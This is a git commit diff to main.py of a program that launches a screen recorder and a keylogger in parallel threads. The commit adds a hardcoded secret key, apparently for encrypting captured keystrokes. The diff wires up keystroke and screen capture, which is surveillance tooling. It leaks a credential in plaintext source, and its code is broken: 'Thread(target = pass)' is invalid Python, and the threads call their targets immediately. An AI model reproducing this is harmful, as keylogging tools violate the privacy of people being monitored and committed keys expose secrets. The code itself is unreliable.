1a6f72fd64f5d1a7249d7c91274c7cf2b0fa4cf2
ittl-jlarios <jared@totaltransportlogistics.us>
2024-06-12 11:53:10 -0600

    fix: scret key added

--- main.py
+++ main.py
@@ -3,10 +3,13 @@ from program.keylog import KeyLog
 
 from threading import Thread
 
+
+SECRET_KEY = b"3lqUcKreSiI3DzVdHHD7VggudxDIcWCp-bONmioaebE="
+
 screen_rec = ScreenRecording
 keylog = KeyLog
 
 if __name__ == '__main__':
     Thread(target = screen_rec()).start()
-    Thread(target = keylog()).start()
+    Thread(target = keylog(key=SECRET_KEY)).start()
     Thread(target = pass).start()
